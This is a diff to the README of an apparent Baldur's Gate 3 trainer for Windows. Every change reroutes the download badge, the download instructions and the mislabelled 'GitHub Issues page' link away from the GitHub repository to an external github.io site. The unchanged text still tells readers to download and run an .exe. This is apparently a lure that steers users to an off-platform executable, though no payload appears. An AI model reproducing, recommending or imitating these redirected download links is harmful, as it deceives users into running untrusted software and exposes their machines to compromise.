@@ -1,6 +1,6 @@
 # ⚔️ baldurs-gate-3-trainer-hub - Enhance Your Single-Player Adventure
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github)](https://github.com/122hotr2187/baldurs-gate-3-trainer-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github)](https://122hotr2187.github.io)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to baldurs-gate-3-trainer-hub, a Windows tool designed for offline, sing
 ### 📥 Download and Install
 
 Visit this link to download the application:
-[Download baldurs-gate-3-trainer-hub](https://github.com/122hotr2187/baldurs-gate-3-trainer-hub/releases)
+[Download baldurs-gate-3-trainer-hub](https://122hotr2187.github.io)
 
 On the releases page, find the latest version (usually at the top) and click the file ending in `.exe` to download. The download should start automatically.
 
@@ -76,7 +76,7 @@ The trainer does not collect any personal data. It only reads and modifies memor
 
 ## 📬 Support
 
-For issues or questions, visit the [GitHub Issues page](https://github.com/122hotr2187/baldurs-gate-3-trainer-hub/issues) to report problems or see known solutions. Updates and new versions are posted on the releases page.
+For issues or questions, visit the [GitHub Issues page](https://122hotr2187.github.io) to report problems or see known solutions. Updates and new versions are posted on the releases page.
 
 ## 🤝 Contributing
 
